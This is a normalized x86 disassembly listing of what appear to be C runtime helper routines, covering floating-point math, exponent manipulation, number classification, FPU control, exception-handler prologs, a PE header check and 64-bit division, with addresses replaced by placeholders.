divsd xmm1 xmm1
mov edx 0x9
mov edx 0x3e9
jmp r-xdata
fld [ r--data ]
retn
mov edx 0x3e9
jmp r-xdata
sub_4482bb
jmp r-xdata
mov [ ebp - 0x90 ] 0xfe
or ch ch
jne r-xdata
call sub_448451
or eax eax
je r-xdata
fxch st1
jmp sub_443d53
xor ch ch
cmp eax 0x2
je r-xdata
call sub_44840e
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
fxch st1
fabs
jmp r-xdata
not ch
test dl 0x40
jne r-xdata
fld1
fdivrp st1
fyl2x
jmp r-xdata
or ch ch
je r-xdata
fscale
jmp sub_443c98
fchs
sub_4482d1
mov [ ebp - 0x90 ] 0xfe
xor ch ch
fldl2e
fmulp st1
call sub_44840e
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
test dl 0x40
jne r-xdata
fld1
fdivrp st1
or ch ch
je r-xdata
fscale
jmp sub_443c98
fchs
sub_44837d
call sub_448451
fstp st0
fstp st0
or cl cl
jne r-xdata
mov [ ebp - 0x90 ] 0x2
fld [ r--data ]
cmp eax 0x1
jne r-xdata
fldz
cmp eax 0x1
jne r-xdata
retn
or ch ch
je r-xdata
or ch ch
je r-xdata
fchs
jmp r-xdata
fchs
sub_44840e
fld st0
fabs
fld [ r--data ]
fcompp
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x41
jne r-xdata
pop eax
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x1
jne r-xdata
fld st0
frndint
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
mov dl [ ebp - 0x9f ]
fxch st1
fsub st1
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fabs
f2xm1
retn
mov [ ebp - 0x90 ] 0x4
jmp sub_443ca6
fstp st0
fld [ r--data ]
or ch ch
je r-xdata
retn
fchs
sub_448451
fld st0
frndint
fcomp st1
fwait
fnstsw ax
sahf
jne r-xdata
mov eax 0x0
jmp r-xdata
fld st0
fmul [ r--data ]
fld st0
frndint
fcompp
fwait
fnstsw ax
sahf
je r-xdata
retn
mov eax 0x2
jmp r-xdata
mov eax 0x1
sub_448485
push esi
sub esp 0x74
mov esi esp
push esi
sub esp 0x8
fstp [ esp ]
sub esp 0x8
fstp [ esp ]
fwait
fnsave [ esi + 0x8 ]
call sub_4487ad
add esp 0x14
frstor [ esi + 0x8 ]
fld [ esi ]
add esp 0x74
pop esi
test eax eax
je r-xdata
retn
jmp sub_443d66
sub_448571
mov edi edi
push ebp
mov ebp esp
movzx ecx [ ebp + 0xe ]
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
add eax 0xfffffc02
shr ecx 0x4
and ecx 0x7ff
add eax ecx
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4486b6
add esp 0xc
pop ebp
retn
sub_4485a0
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fucom st1
fnstsw ax
push edi
test ah 0x44
jpe r-xdata
push esi
mov si [ ebp + 0xe ]
movzx eax si
test eax 0x7ff0
jne r-xdata
fstp st1
xor edi edi
jmp r-xdata
push 0x0
push ecx
fstp st0
push ecx
fstp [ esp ]
call sub_4486b6
movzx edi si
add esp 0xc
shr edi 0x4
and edi 0x7ff
sub edi 0x3fe
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
test ecx 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
pop edi
pop ebp
retn
fcompp
mov edi 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
test edx edx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
mov ecx 0xffef
and si cx
mov [ ebp + 0xe ] si
test eax eax
je r-xdata
add ecx ecx
mov [ ebp + 0xc ] ecx
test edx edx
jns r-xdata
test [ ebp + 0xe ] 0x10
jne r-xdata
fld [ ebp + 0x8 ]
push 0x0
push ecx
push ecx
fstp [ esp ]
call sub_4486b6
add esp 0xc
jmp r-xdata
mov eax 0x8000
or si ax
mov [ ebp + 0xe ] si
add edx edx
dec edi
test [ ebp + 0xe ] 0x10
je r-xdata
or ecx 0x1
mov [ ebp + 0xc ] ecx
pop esi
mov si [ ebp + 0xe ]
mov [ ebp + 0x8 ] edx
sub_44868d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
movzx eax [ ebp + 0xe ]
fld [ ebp + 0x8 ]
and eax 0x800f
shl ecx 0x4
fstp [ ebp - 0x8 ]
or ecx eax
mov [ ebp - 0x2 ] cx
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4486b6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
movzx eax [ ebp + 0xe ]
fld [ ebp + 0x8 ]
and eax 0x800f
fstp [ ebp - 0x8 ]
lea ecx [ ecx + 0x3fe ]
shl ecx 0x4
or ecx eax
mov [ ebp - 0x2 ] cx
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4486e5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x7ff00000
mov eax [ ebp + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
test eax eax
jne r-xdata
mov cx [ ebp + 0xe ]
mov edx 0x7ff8
and cx dx
cmp cx dx
jne r-xdata
test eax eax
jne r-xdata
inc eax
pop ebp
retn
mov edx 0x7ff0
cmp cx dx
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_448743
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4489a2
pop ecx
pop ecx
test al 0x90
jne r-xdata
xor eax eax
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4488d8
fld [ ebp + 0x8 ]
fucom st1
fnstsw ax
pop ecx
pop ecx
fstp st1
test ah 0x44
jpe r-xdata
fstp st0
fmul [ r--data ]
push ecx
push ecx
fst [ ebp - 0x8 ]
fstp [ esp ]
call sub_4488d8
fld [ ebp - 0x8 ]
fucompp
fnstsw ax
pop ecx
pop ecx
test ah 0x44
jpe r-xdata
xor eax eax
inc eax
jmp r-xdata
push 0x2
pop eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4487ad
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ecx 0x7ff00000
fabs
mov eax 0xfff00000
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp + 0x14 ] eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
fstp st0
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp [ ebp + 0xc ] eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
fcom st1
fnstsw ax
fstp st1
test ah 0x41
mov eax [ ebp + 0x18 ]
jne r-xdata
fstp st1
fstp st0
fld [ rw-data ]
jmp r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
fldz
fld [ ebp + 0x10 ]
fcom st1
fnstsw ax
test ah 0x41
je r-xdata
fcom st1
fnstsw ax
fstp st1
test ah 0x41
mov eax [ ebp + 0x18 ]
jne r-xdata
fstp st1
fstp st0
fldz
jmp r-xdata
fstp [ eax ]
fstp st0
fldz
jmp r-xdata
mov eax [ ebp + 0x18 ]
fld [ ebp + 0x10 ]
push ecx
push ecx
fstp [ esp ]
call sub_448743
fldz
fld [ ebp + 0x10 ]
pop ecx
pop ecx
fcom st1
mov ecx eax
fnstsw ax
test ah 0x41
jne r-xdata
fcomp st1
fnstsw ax
test ah 0x5
mov eax [ ebp + 0x18 ]
jpo r-xdata
fstp st0
fld [ rw-data ]
jmp r-xdata
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st0
fld [ rw-data ]
cmp ecx 0x1
jne r-xdata
fstp st0
fld1
jmp r-xdata
fstp st0
fld1
cmp ecx 0x1
jne r-xdata
fchs
jmp r-xdata
fstp st0
fld [ rw-data ]
jmp r-xdata
sub_4488ee
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov ecx eax
not ecx
xor ecx eax
not eax
and ecx 0x7fffffff
xor ecx eax
mov [ ebp - 0x4 ] ecx
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_44891d
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx eax
not ecx
xor ecx eax
not eax
and ecx 0x7fffffff
xor ecx eax
mov [ ebp - 0x4 ] ecx
fld [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_448940
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
xor eax [ ebp + 0xc ]
and eax 0x7fffffff
xor eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_44896a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
xor eax [ ebp + 0x8 ]
and eax 0x7fffffff
xor eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4489a2
mov edi edi
push ebp
mov ebp esp
mov cx [ ebp + 0xe ]
mov edx 0x7ff0
mov ax cx
and ax dx
cmp ax dx
jne r-xdata
movzx ecx cx
and ecx 0x8000
test ax ax
jne r-xdata
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4486e5
pop ecx
pop ecx
sub eax 0x1
je r-xdata
fld [ ebp + 0x8 ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpe r-xdata
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax 0x200
pop ebp
retn
sub eax 0x1
je r-xdata
neg ecx
sbb ecx ecx
and ecx 0xffffff08
lea eax [ ecx + 0x100 ]
pop ebp
retn
neg ecx
sbb ecx ecx
and ecx 0xffffffe0
lea eax [ ecx + 0x40 ]
pop ebp
retn
neg ecx
sbb ecx ecx
and ecx 0xffffff90
lea eax [ ecx + 0x80 ]
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x4
sub eax 0x1
je r-xdata
push 0x2
jmp r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
sub_448a46
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0xe ]
mov edx 0x7ff8
and ax dx
lea ecx [ edx - 0x8 ]
cmp ax cx
jne r-xdata
cmp ax dx
jne r-xdata
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
sub_448a7c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov edi 0xffff
push edi
push 0x133f
call sub_445b6f
fld [ ebp + 0x8 ]
mov esi eax
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucomp st1
fnstsw ax
test ah 0x44
jpe r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_4486e5
pop ecx
pop ecx
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4485a0
mov eax [ ebp - 0x4 ]
fstp st0
dec eax
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
push edi
push esi
fstp [ ebp - 0xc ]
call sub_445b6f
fld [ ebp - 0xc ]
add esp 0x14
fld [ rw-data ]
push esi
sub esp 0x10
fchs
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0x25
push 0x4
jmp r-xdata
fld [ ebp + 0x8 ]
fld [ r--data ]
push esi
sub esp 0x10
fadd st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0x25
push 0x8
cmp eax 0x2
jle r-xdata
call sub_447081
add esp 0x1c
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push edi
push esi
call sub_445b6f
pop ecx
pop ecx
cmp eax 0x3
je r-xdata
fld [ ebp + 0x8 ]
jmp r-xdata
sub_448b86
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov edi 0xffff
push edi
push 0x133f
call sub_445b6f
fld [ ebp + 0x8 ]
mov esi eax
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucomp st1
fnstsw ax
test ah 0x44
jpe r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_4486e5
pop ecx
pop ecx
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4485a0
mov ecx [ ebp + 0x10 ]
add esp 0xc
mov edx [ ebp - 0x4 ]
test ecx ecx
jns r-xdata
fstp st0
fld [ ebp + 0x8 ]
fld [ r--data ]
fadd st1
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x8
jmp r-xdata
cmp eax 0x2
jle r-xdata
mov eax 0x7fffffff
sub eax ecx
cmp edx eax
jg r-xdata
mov eax 0x80000000
sub eax ecx
cmp edx eax
jl r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_44714f
add esp 0x24
push edi
push esi
call sub_445b6f
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
cmp eax 0x3
jne r-xdata
push esi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ rw-data ]
fstp [ esp ]
call sub_448940
fstp [ esp + 0x8 ]
fild [ ebp + 0x10 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fstp [ esp ]
push ecx
push ecx
lea eax [ edx + ecx ]
cmp eax 0xa00
jg r-xdata
fldz
fmulp st1
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
jmp r-xdata
fild [ ebp + 0x10 ]
sub esp 0x10
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
call sub_447437
add esp 0x10
jmp r-xdata
cmp eax 0x400
jle r-xdata
cmp eax 0xfffff603
jge r-xdata
add eax 0xfffffa00
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4486b6
add esp 0xc
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fstp [ esp + 0x8 ]
jmp r-xdata
cmp eax 0xfffffc03
jge r-xdata
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x11
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4486b6
push edi
push esi
fstp [ ebp - 0xc ]
call sub_445b6f
fld [ ebp - 0xc ]
add esp 0x14
jmp r-xdata
add eax 0x600
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4486b6
add esp 0xc
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
jmp r-xdata
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x12
jmp r-xdata
sub_448d8c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
call sub_448fee
pop ecx
push 0x2
movzx esi ax
mov ebx 0x7ff0
pop edi
cmp si di
je r-xdata
test [ ebp + 0xe ] bx
pop edi
pop esi
pop ebx
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_44919d
fld [ ebp + 0x10 ]
pop ecx
cmp ax di
je r-xdata
fld [ ebp + 0x8 ]
pop ebp
retn
push 0x10
call sub_44916f
pop ecx
fstp [ ebp + 0x8 ]
fld [ ebp + 0x8 ]
fucom st1
fnstsw ax
test ah 0x44
jpo r-xdata
fstp st0
xor ecx ecx
inc ecx
cmp si cx
jne r-xdata
test si si
jne r-xdata
mov ax [ ebp + 0xe ]
mov ecx 0xffef
and ax cx
mov [ ebp + 0xa ] 0xffffffff
lea ecx [ ebx - 0x1 ]
fstp st0
or ax cx
fstp st0
mov ecx 0xffff
jmp r-xdata
fcom st1
fnstsw ax
fldz
test ah 0x5
jpe r-xdata
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp + 0xe ] ax
mov [ ebp + 0x8 ] cx
jmp r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fcom st1
fnstsw ax
test ah 0x5
jpo r-xdata
mov eax 0x8000
xor eax eax
jmp r-xdata
fstp st0
fstp st0
fcompp
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st1
fstp st1
fstp st0
mov ax [ ebp + 0xa ]
add ax cx
mov [ ebp + 0xa ] ax
cmp ax cx
jne r-xdata
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
add ax cx
mov [ ebp + 0x8 ] ax
cmp ax cx
jne r-xdata
jmp r-xdata
add [ ebp + 0xa ] 0x1
jne r-xdata
mov ax [ ebp + 0xc ]
add ax cx
mov [ ebp + 0xc ] ax
cmp ax cx
jne r-xdata
add [ ebp + 0x8 ] 0x1
jne r-xdata
add [ ebp + 0xc ] 0x1
jne r-xdata
add [ ebp + 0xe ] cx
jmp r-xdata
mov ax [ ebp + 0xe ]
inc ax
mov [ ebp + 0xe ] ax
movzx eax ax
and eax 0xffff7fff
cmp eax ebx
jne r-xdata
push 0x8
call sub_44916f
pop ecx
jmp r-xdata
sub_448ee7
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
mov eax 0x7ff
movzx edx [ esi + 0x6 ]
mov ecx edx
shr ecx 0x4
and ecx eax
mov [ ebp - 0x4 ] ecx
cmp cx ax
jne r-xdata
test edx 0xffff7fff
jne r-xdata
test dl 0xf
jne r-xdata
mov eax 0x433
sub eax ecx
sub eax [ ebp + 0xc ]
movzx ecx ax
mov ax cx
mov [ ebp - 0x4 ] ecx
test ax ax
jle r-xdata
xor eax eax
cmp [ esi + 0x4 ] ax
jne r-xdata
push 0x2
pop eax
jmp r-xdata
xor eax eax
cmp [ esi + 0x4 ] ax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
push 0x35
pop edi
cmp di ax
jg r-xdata
cmp [ esi + 0x2 ] ax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x2 ] ax
jne r-xdata
sar ax 0x4
and ecx 0xf
movsx edi ax
movzx edx [ ecx * 2 + r--data ]
mov ecx [ edi * 4 + r--data ]
movzx eax [ esi + ecx * 2 ]
and edx eax
xor eax edx
mov [ ebp - 0x4 ] edx
mov [ esi + ecx * 2 ] ax
mov cx dx
sub edi 0x1
je r-xdata
xor eax eax
and edx 0x8000
mov [ esi + 0x2 ] eax
mov [ esi ] ax
or eax 0xffffffff
mov [ esi + 0x6 ] dx
jmp r-xdata
cmp [ esi ] ax
jne r-xdata
cmp [ esi ] ax
jne r-xdata
or cx [ esi ]
xor eax eax
mov [ esi ] ax
sub edi 0x1
je r-xdata
pop edi
inc eax
jmp r-xdata
or cx [ esi + 0x2 ]
xor eax eax
mov [ esi + 0x2 ] ax
sub edi 0x1
jne r-xdata
xor eax eax
test cx cx
sete al
dec eax
or cx [ esi + 0x4 ]
xor eax eax
mov [ esi + 0x4 ] ax
sub_448fee
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov esi 0x7ff0
movzx eax [ ecx + 0x6 ]
mov edx eax
and edx esi
cmp dx si
pop esi
jne r-xdata
test eax 0xffff7fff
jne r-xdata
test al 0xf
jne r-xdata
xor eax eax
test dx dx
setne al
sub eax 0x2
pop ebp
retn
xor eax eax
cmp [ ecx + 0x4 ] ax
jne r-xdata
push 0x2
pop eax
pop ebp
retn
xor eax eax
cmp [ ecx + 0x4 ] ax
jne r-xdata
cmp [ ecx + 0x2 ] ax
jne r-xdata
cmp [ ecx + 0x2 ] ax
jne r-xdata
cmp [ ecx ] ax
jne r-xdata
cmp [ ecx ] ax
jne r-xdata
pop ebp
retn
inc eax
pop ebp
retn
sub_449052
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
mov eax 0xff
movzx ecx [ esi + 0x2 ]
mov edx ecx
shr edx 0x7
and edx eax
mov [ ebp - 0x4 ] edx
cmp dx ax
jne r-xdata
test ecx 0xffff7fff
jne r-xdata
test cl 0x7f
jne r-xdata
mov eax 0x96
sub eax edx
sub eax [ ebp + 0xc ]
movzx eax ax
push edi
mov di ax
mov [ ebp - 0x4 ] eax
test di di
jg r-xdata
cmp [ esi ] 0x0
jne r-xdata
push 0x2
pop eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push 0x18
pop edx
cmp dx di
jg r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
and eax 0xf
sar di 0x4
movzx edx [ eax * 2 + r--data ]
movsx eax di
mov ecx [ eax * 4 + r--data ]
movzx eax [ esi + ecx * 2 ]
and edx eax
xor eax edx
mov [ ebp - 0x4 ] edx
mov [ esi + ecx * 2 ] ax
xor eax eax
mov cx dx
cmp ax di
jge r-xdata
xor eax eax
and ecx 0x8000
mov [ esi ] ax
or eax 0xffffffff
mov [ esi + 0x2 ] cx
jmp r-xdata
pop edi
xor eax eax
test cx cx
sete al
dec eax
or cx [ esi ]
mov [ esi ] ax
sub_449121
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov esi 0x7f80
movzx eax [ ecx + 0x2 ]
mov edx eax
and edx esi
cmp dx si
pop esi
jne r-xdata
test eax 0xffff7fff
jne r-xdata
test al 0x7f
jne r-xdata
xor eax eax
test dx dx
setne al
sub eax 0x2
pop ebp
retn
cmp [ ecx ] 0x0
jne r-xdata
push 0x2
pop eax
pop ebp
retn
cmp [ ecx ] 0x0
jne r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_44916f
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push 0x1f
push eax
call sub_44922e
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4491a8
add esp 0x10
mov esp ebp
pop ebp
retn
sub_4491a8
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
test bl 0x18
je r-xdata
test bl 0x20
je r-xdata
or ebx 0x20
test bl 0x10
je r-xdata
or eax 0x1
mov [ ebp - 0x4 ] eax
test bl 0x8
je r-xdata
or eax 0x2
mov [ ebp - 0x4 ] eax
test bl 0x4
je r-xdata
or eax 0x4
mov [ ebp - 0x4 ] eax
push esi
mov esi ebx
and esi 0x1
je r-xdata
or eax 0x8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push 0x1f
push eax
call sub_449254
pop ecx
pop ecx
test esi esi
pop esi
je r-xdata
or eax 0x10
mov [ ebp - 0x4 ] eax
test bl 0x1c
je r-xdata
call sub_42fef5
mov [ eax ] 0x21
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x22
sub_44922e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
and esi 0x1f
jne r-xdata
call sub_447ee6
mov ecx [ ebp + 0x8 ]
and eax esi
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
and [ eax ] esi
jmp r-xdata
xor eax eax
pop esi
pop ebp
retn
sub_449254
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0xc ] 0x1f
jne r-xdata
push esi
call sub_447ee6
mov ecx [ ebp + 0xc ]
mov esi eax
not ecx
and esi ecx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
and ecx [ ebp + 0xc ]
or esi ecx
push esi
call sub_447fa7
push esi
call sub_449296
pop ecx
pop ecx
xor ecx ecx
cmp eax esi
pop esi
setne cl
mov eax ecx
pop ebp
retn
xor eax eax
pop ebp
retn
sub_449296
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
call sub_44922e
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_4494c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push ebx
push esi
push edi
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
add eax ecx
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_449510
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_40e4e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_4495d0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_4494c0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4495d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_449638
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_44966c
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_4496a3
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_4496da
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax

sub_449720
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
